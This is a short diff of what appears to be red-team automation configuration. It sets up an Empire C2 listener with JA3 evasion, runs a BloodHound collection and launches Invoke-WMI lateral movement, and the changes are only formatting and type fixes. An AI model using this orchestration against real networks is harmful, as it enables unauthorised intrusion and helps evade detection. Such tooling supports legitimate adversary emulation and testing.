@@ -104,7 +104,7 @@ resource "task" "c2_task" {
             Profile     = "trevor.profile"
             Host        = "https://c2-${resource.random_string.random_6.result}.${variable.domain_name}:443"
             Port        = "443"
-            CertPath = "/opt/Empire/empire/server/data/"
+            CertPath    = "/opt/Empire/empire/server/data/"
             StagingKey  = resource.random_string.random_32.result
             JA3_Evasion = "True"
         }
@@ -370,8 +370,8 @@ action "execute_agent_module" "bloodhound" {
 
     module_args = {
         CollectionMethod = "Default"
-        Threads          = 20
-        Throttle         = 1000
+        Threads          = "20"
+        Throttle         = "1000"
     }
 }
 
@@ -384,7 +384,7 @@ action "execute_agent_module" "invoke_wmi" {
     depends_on        = action.execute_agent_module.bloodhound
 
     module_args = {
-        ComputerName = data.tasks.lateral_movement_task.host_name
+        ComputerName = data.tasks.lateral_movement_task.local_ip
         Listener     = resource.task.c2_task.listener.listener_type
     }
 }
